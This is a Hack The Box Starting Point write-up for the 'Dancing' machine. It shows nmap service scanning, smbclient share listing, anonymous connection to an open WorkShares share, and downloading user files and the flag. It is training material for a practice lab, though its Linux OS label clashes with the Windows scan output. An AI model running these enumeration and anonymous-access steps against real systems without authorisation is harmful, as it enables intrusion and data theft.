+++
title = "Dancing"
description = "Starting Point machine focused on service enumeration and access through SMB."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
    "SMB",
    "Enumeration",
    "Starting Point",
    "Foundations"
]

image = "/images/writeups/dancing.png"
+++

### Overview

**Dancing** is a machine from the **Starting Point** path on Hack The Box. It is designed to practice fundamental concepts of reconnaissance, service enumeration, and access to shared resources through SMB.

The objective is to identify the exposed SMB service, enumerate the available shared resources, and access the files containing the flag.

---

### Enumeration

We begin by performing an **Nmap** scan to identify the available ports and services:

```bash
nmap -sV -sC <TARGET_IP>
```

The scan shows the following services:

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Ports `139/tcp` and `445/tcp` indicate that the target exposes services related to **SMB**, so we proceed to enumerate the available shared resources.

We use `smbclient` to list the available shares:

```bash
smbclient -L <TARGET_IP>
```

The server displays the following resources:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

The `WorkShares` share is particularly interesting because it is accessible without authentication.

---

### Initial Access

We connect to the shared resource using `smbclient` and the `-N` option to connect without providing a password:

```bash
smbclient //<TARGET_IP>/WorkShares -N
```

The connection is established successfully:

```text
Try "help" to get a list of possible commands.
smb: \>
```

Once inside the shared resource, we list its contents:

```bash
ls
```

We find two directories:

```text
Amy.J
James.P
```

We access the `Amy.J` directory:

```bash
cd Amy.J
ls
```

Inside, we find the following file:

```text
worknotes.txt
```

We download the file using `get`:

```bash
get worknotes.txt
```

We then return to the main directory and access `James.P`:

```bash
cd ..
cd James.P
ls
```

Inside this directory, we find:

```text
flag.txt
```

---

### Flag

We download the flag using the `get` command:

```bash
get flag.txt
```

The file is successfully downloaded and contains the machine's flag.

This completes the **Dancing** machine.

---

### Conclusion

**Dancing** presents a straightforward scenario primarily focused on service enumeration and access to shared resources through SMB.

The methodology followed was:

```text
Enumeration
    ↓
SMB Identification
    ↓
Shared Resource Enumeration
    ↓
Access to WorkShares
    ↓
Directory Enumeration
    ↓
Access to James.P
    ↓
Flag Download
```

Despite its **Very Easy** difficulty, the machine reinforces the importance of properly enumerating SMB services and reviewing shared resources that may be accessible without authentication.

---

### [Status: Completed](https://labs.hackthebox.com/achievement/machine/3933963/395)

